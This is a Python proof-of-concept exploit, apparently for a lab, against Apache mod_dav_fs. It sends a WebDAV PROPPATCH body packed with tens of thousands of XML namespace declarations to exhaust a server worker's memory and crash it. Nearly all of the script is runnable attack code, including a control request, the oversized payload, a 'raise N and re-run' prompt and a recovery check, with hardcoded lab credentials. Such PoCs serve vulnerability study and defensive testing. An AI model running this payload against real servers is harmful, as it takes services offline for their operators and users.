#!/usr/bin/env python3
# CVE-2026-93546 PoC - mod_dav_fs many-namespace PROPPATCH worker crash.
#
# Authorized ACW3 lab use only: run against your own local, isolated
# vulnerable-env target (default http://localhost:8080). Do NOT point this at
# anything you do not own.
#
# Usage:
#   python3 poc_dav_overflow.py [target_url] [namespace_count]
#   python3 poc_dav_overflow.py http://localhost:8080 45000
#
# What it does: declares N distinct XML namespaces in a single PROPPATCH body.
# mod_dav_fs's namespace handling blows up O(n^2) in memory/CPU; the worker
# exhausts its memory cap and is killed (connection reset), i.e. a DoS. With the
# lab's 512 MB container cap this takes ~5 s and the host stays safe; the service
# auto-recovers a second later.
import sys, time, requests
from requests.auth import HTTPDigestAuth

T = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
N = int(sys.argv[2]) if len(sys.argv) > 2 else 45000
U, P = "labuser", "labpass123"
tgt = f"{T}/dav/target.txt"
auth = lambda: HTTPDigestAuth(U, P)


def alive():
    try:
        return requests.request("PROPFIND", f"{T}/dav/", auth=auth(),
                                 headers={"Depth": "0"}, timeout=10).status_code
    except Exception as e:
        return f"DOWN/{type(e).__name__}"


# 0) control: a well-formed PROPPATCH should return 207 Multi-Status.
requests.put(tgt, data=b"x", auth=auth())
ok = ('<?xml version="1.0"?><D:propertyupdate xmlns:D="DAV:"><D:set><D:prop>'
      '<Z:a xmlns:Z="http://x/">1</Z:a></D:prop></D:set></D:propertyupdate>').encode()
c = requests.request("PROPPATCH", tgt, data=ok, auth=auth(),
                     headers={"Content-Type": "application/xml"})
print(f"[control] well-formed PROPPATCH -> {c.status_code} (expect 207)")

# 1) attack: N distinct namespace declarations.
body = ('<?xml version="1.0" encoding="utf-8"?>'
        '<D:propertyupdate xmlns:D="DAV:"><D:set><D:prop>'
        + ''.join(f'<p xmlns="u{i}"/>' for i in range(N))
        + '</D:prop></D:set></D:propertyupdate>').encode()
print(f"[attack]  PROPPATCH: {len(body)} bytes, {N} namespace declarations")
t = time.time()
try:
    r = requests.request("PROPPATCH", tgt, data=body, auth=auth(),
                         headers={"Content-Type": "application/xml"}, timeout=90)
    print(f"[attack]  server survived: {r.status_code} in {time.time()-t:.1f}s "
          f"-- raise N and re-run")
except Exception as e:
    print(f"[attack]  WORKER DIED: {type(e).__name__} after {time.time()-t:.1f}s")

time.sleep(1)
print(f"[recovery] {alive()}  (service auto-recovers after the child respawns)")
